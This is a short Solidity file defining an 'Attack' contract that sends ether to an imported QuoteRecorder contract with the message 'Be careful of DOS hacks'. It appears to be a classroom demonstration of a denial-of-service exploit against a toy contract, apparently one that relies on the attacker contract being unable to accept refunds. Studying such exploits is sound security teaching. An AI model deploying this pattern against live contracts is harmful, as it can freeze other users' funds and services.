//SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;
import "QuoteRecorder.sol";
contract Attack{
    
    function attack(QuoteRecorder _quoteRecorder) public {
        _quoteRecorder.record{value : msg.value}("Be careful of DOS hacks");
    }
    
    function getQuoteRecorderBalance(QuoteRecorder _quoteRecorder)
    public view returns(uint){
        return _quoteRecorder.balance();
    }
}